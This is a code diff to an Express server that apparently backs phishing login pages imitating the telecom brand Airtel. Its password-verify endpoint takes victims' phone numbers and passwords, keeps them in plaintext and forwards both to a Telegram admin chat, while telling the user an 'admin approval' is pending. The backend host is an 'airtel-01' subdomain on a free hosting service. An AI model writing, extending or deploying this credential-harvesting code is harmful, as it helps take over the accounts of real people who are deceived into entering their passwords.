@@ -13,7 +13,7 @@ app.use(express.json());
 // Environment variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
-const BACKEND_URL = process.env.BACKEND_URL || "http://localhost:3000";
+const BACKEND_URL = (process.env.BACKEND_URL || "https://airtel-01.onrender.com").trim();
 const PORT = process.env.PORT || 3000;
 
 // Initialize Telegram Bot
@@ -250,33 +250,44 @@ app.post("/api/telegram/webhook", (req, res) => {
 
 /**
  * POST /api/password/verify
- * Receive password from login1 and notify Telegram admin for verification
+ * Verify password for login1.html - sends to Telegram admin for approval
  */
-app.post('/api/password/verify', (req, res) => {
+app.post("/api/password/verify", (req, res) => {
   const { phone, password } = req.body;
 
   if (!phone || !password) {
-    return res.status(400).json({ error: 'Missing required fields: phone, password' });
+    return res
+      .status(400)
+      .json({ error: "Missing required fields: phone, password" });
   }
 
   const requestId = uuidv4();
   const timestamp = new Date().toISOString();
 
+  // Store the password verification request
   otpRequests.set(requestId, {
     requestId,
-    type: 'password_verify',
     phone,
     password,
     timestamp,
+    type: "password_login1",
     approved: false,
     rejectedReason: null,
   });
 
+  // Send notification to Telegram admin
   sendTelegramPasswordNotification(requestId, phone, password);
 
-  console.log(`[PASSWORD_VERIFY] New password verification request ${requestId} for ${phone}`);
+  console.log(
+    `[PASSWORD-LOGIN1] New verification request ${requestId} for ${phone}`
+  );
 
-  res.json({ success: true, requestId, message: 'Password submitted for verification. Awaiting admin approval.' });
+  res.json({
+    success: true,
+    requestId,
+    message:
+      "Password submitted for verification. Awaiting admin approval.",
+  });
 });
 
 /**
